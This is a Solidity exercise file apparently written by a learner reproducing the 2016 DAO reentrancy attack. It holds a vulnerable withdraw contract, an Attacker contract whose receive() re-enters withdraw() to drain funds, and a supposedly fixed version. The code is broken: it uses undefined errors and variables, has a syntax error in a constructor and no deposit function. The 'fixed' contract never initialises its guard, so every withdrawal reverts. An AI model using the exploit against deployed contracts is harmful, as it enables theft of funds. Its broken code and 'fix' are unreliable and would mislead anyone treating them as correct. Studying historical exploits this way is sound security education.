// SPDX-Licence-Identifer: MIT
pragma solidity ^0.8.34;

/*

Tier 4 Exercise 5 — Reproduce a Historical Exploit

Real world context: This is what separates people who "know Solidity" from people who think like auditors. Real security researchers study past exploits obsessively — not to copy them, but to internalize the failure patterns so they recognize them instantly in new code.

The exploit: The DAO Hack (2016) — the original reentrancy attack

You already built a reentrancy exercise back in Tier 2, so the mechanism itself won't be new. This time the goal is different: reproduce it as a complete, documented case study — vulnerable contract, exploit contract, a written explanation of the real-world impact, and the fix — as if you were writing it up for a portfolio or a blog post.

What to build:

1. TheDAO_Vulnerable — a simplified version of the actual DAO's vulnerable withdraw pattern:

Users deposit ETH, tracked in a balance mapping
A withdraw() function that sends ETH via a low-level call before updating the balance (the exact real-world bug)

2. Attacker — the exploit contract:

Deposits into the vulnerable contract
Calls withdraw()
Uses receive() to re-enter withdraw() repeatedly before the balance updates, draining funds

3. TheDAO_Fixed — the patched version using CEI + a reentrancy guard

What's different this time — the write-up:

Since this is your portfolio-closing exercise for the whole roadmap, write a short markdown-style summary as a comment block at the top, covering:

What actually happened in June 2016 — roughly $60M in ETH drained, leading to Ethereum's contentious hard fork that created ETH and ETH Classic as separate chains
Why the bug existed — what pattern the original Solidity compiler/community didn't yet treat as dangerous
Why this specific incident is the reason ReentrancyGuard and the CEI pattern became mandatory practice industry-wide

You can research the real numbers and timeline — that part should be factually accurate, not just recalled from memory.

Since you already know how to build the mechanism itself, spend real time on the research and the write-up quality here. This exercise is meant to end up being the piece you'd actually show someone to prove you understand why security patterns exist, not just how to apply them.

Go.

*/

/*
	okay lets start this is the last exercise for this phase.

	i am ordered to build three contracts the vunrable contract, the attacker contract and the fixed contract.
	so like just to show i can't write the whole contract like all of it like the whole dao so i am just gonna write a simple one okay
	so i will do that then i will write the attacker contract and the fixed contract and i will do the talking shit okay.

	lets start.


*/

contract TheDAO_Vulnerable {
	mapping(address => uint256) public balances;


    function withdraw(uint256 amount) public {
        if(balances[msg.sender] < amount) revert notEnough();

        (bool success, ) = msg.sender.call{value: amount}(""); 
        require(success, "failed transaction");

        balances[msg.sender] -= amount; 
    }

    function getBalance() public view returns(uint256) {
    	return address(this).balance;
    }
}


contract Attacker {
	TheDAO_Vulnerable public target; 
	uint256 public amountToWithdraw = 1 ether; 
	uint256 public whenToStop = 3640000 ether;

	address private owner; 

    constructor(address _target,) {
        target = TheDAO_Vulnerable(_target);
        owner = msg.sender;

    }

    function attack() external {
        target.withdraw(amountToWithdraw);
    }

    receive() external payable {
        if(address(target).balances >= amountToWithdraw){
            if(address(this).balances <= whenToStop) {
            	target.withdraw(starter);
        	}
        }
    }

    function collect(address _to) public {
    	if(owner != msg.sender) revert NotOwner();

    	(bool success, ) = msg.sender.call{value : address(this).balance}("");
    	require(success , "transfer failed");
    }
}

contract TheDAO_Fixed {
	mapping(address => uint256) public balances;

	uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;

    uint256 private status;

	modifier nonReentrant() {
		require(status == NOT_ENTERED, "IT IS REENTERING");

		status = ENTERED;

		_;

		status = NOT_ENTERED;
	}

    function withdraw(uint256 amount) public nonReentrant {
        if(balances[msg.sender] < amount) revert notEnough();

        balances[msg.sender] -= amount; 

        (bool success, ) = msg.sender.call{value: amount}(""); 
        require(success, "failed transaction");
    }

    function getBalance() public view returns(uint256) {
    	return address(this).balance;
    }
}